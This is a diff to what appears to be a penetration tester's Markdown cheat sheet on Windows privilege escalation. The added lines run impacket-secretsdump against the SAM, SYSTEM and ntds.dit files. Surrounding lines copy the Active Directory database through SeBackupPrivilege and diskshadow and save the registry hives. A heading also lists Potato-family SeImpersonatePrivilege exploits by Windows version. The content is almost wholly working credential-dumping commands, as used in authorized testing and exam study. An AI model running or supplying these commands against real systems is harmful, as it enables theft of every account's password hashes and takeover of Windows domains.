@@ -401,6 +401,9 @@ cmd /c diskshadow /s disk_command.txt
 Copy-FileSeBackupPrivilege z:\windows\ntds\ntds.dit .\ntds.dit
 reg save HKLM\SYSTEM system
 reg save HKLM\SAM sam
+
+impacket-secretsdump -sam SAM -system SYSTEM LOCAL
+impacket-secretsdump -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
 ```
 ### Abuse SeImpersonatePrivilege(GodPotato->JuicyPotatoNG->RoguePotato->PrintSpoofer->JuicyPotato)
 >JuicyPotato -> Windows 7/8, Server 2008 R2/2012/2012 R2, early Windows 10/Server 2016
@@ -474,6 +477,7 @@ windows: reg save HKLM\SYSTEM C:\users\public\SYSTEM
 copy sam and system to kali
 
 impacket-secretsdump -sam SAM -system SYSTEM LOCAL
+impacket-secretsdump -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
 ```
 netexec
 ```
